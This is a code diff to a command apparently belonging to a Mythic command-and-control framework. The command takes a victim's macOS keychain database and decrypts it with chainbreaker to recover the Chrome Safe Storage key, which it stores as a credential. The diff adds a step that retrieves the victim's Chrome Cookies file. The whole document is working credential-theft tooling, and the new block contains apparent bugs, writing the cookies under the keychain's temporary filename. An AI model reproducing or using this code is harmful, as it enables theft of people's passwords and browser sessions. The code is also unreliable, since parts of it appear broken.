@@ -68,11 +68,12 @@ class CookieThiefCommand(CommandBase):
         password = task.args.get_arg("password")
         getkeychainDBResp = await MythicRPC().execute("get_file", task_id=task.id,filename="login.keychain-db", limit_by_callback=True, max_results=1, get_contents=True)
         if getkeychainDBResp.status == "success":
-            getkeychainDBResp = getkeychainDBResp.response[0]
+            getkeychainDBResp = getkeychainDBResp[0]
         else:
             print("Encountered an error attempting to get downloaded file: " + getkeychainDBResp.error)
             sys.stdout.flush()
 
+        ## Write the downloaded login.keychain-db file to a new file on disk
         try:
             f = open("tmp_login.keychain-db", "wb")
             f.write(base64.b64decode(getkeychainDBResp["contents"]))
@@ -81,15 +82,15 @@ class CookieThiefCommand(CommandBase):
             print("Encountered an error attempting to write the keychainDB to a file: " + str(e))
             sys.stdout.flush()
 
-
+        ## Decrypt Keychain and export keys to files
         try:
             subprocess.run(["python2", "/Mythic/mythic/chainbreaker/chainbreaker.py", "--password=" + password, "--export-generic-passwords", "tmp_login.keychain-db"])
-
+            await MythicRPC().execute("create_output",task_id=task.id,output="Keychain Decrypted")
         except Exception as e:
             print("Chainbreaker script failed with error: " + str(e))
             sys.stdout.flush()
 
-
+        ## Remove the login.keychain-db file from disk
         try:
             if os.path.isfile('/Mythic/mythic/tmp_login.keychain-db'):
                 os.remove('/Mythic/mythic/tmp_login.keychain-db')
@@ -101,7 +102,7 @@ class CookieThiefCommand(CommandBase):
             sys.stdout.flush()
 
 
-
+        ## parse the Chrome Safe Storage key from the coresponding keychain password dump file
         fndstr = "Password: "
         ccs_password = ""
         try:
@@ -117,6 +118,7 @@ class CookieThiefCommand(CommandBase):
 
         ccs_keyfile.close()
 
+        ## Remove the keychain password dump directory
         try:
             shutil.rmtree("/Mythic/mythic/passwords")
         except Exception as e:
@@ -125,7 +127,21 @@ class CookieThiefCommand(CommandBase):
 
         create_cred_resp = await MythicRPC().execute("create_credential",task_id=task.id,credential_type="plaintext",account="Chrome Safe Storage",realm="local",credential=ccs_password,metadata="",comment="Chrome Safe Storage Key")
         if create_cred_resp.status == MythicStatus.Success:
-            await MythicRPC().execute("create_output",task_id=task.id,output="Chrome Safe Storage Key added to credentials.")
+            await MythicRPC().execute("create_output",task_id=task.id,output="Chrome Safe Storage Key added to credentials")
 
+        ## write the cookies file to a new file on disk
+        getCookiesResp = await MythicRPC().execute("get_file", task_id=task.id,filename="Cookies", limit_by_callback=True, max_results=1, get_contents=True)
+        if getCookiesResp.status == "success":
+            getCookiesResp = getCookiesResp[0]
+        else:
+            print("Encountered an error attempting to get downloaded file: " + getCookiesResp.error)
+            sys.stdout.flush()
+        try:
+            f = open("tmp_login.keychain-db", "wb")
+            f.write(base64.b64decode(getCookiesResp["contents"]))
+            f.close()
+        except Exception as e:
+            print("Encountered an error attempting to write the keychainDB to a file: " + str(e))
+            sys.stdout.flush()
 
         return task
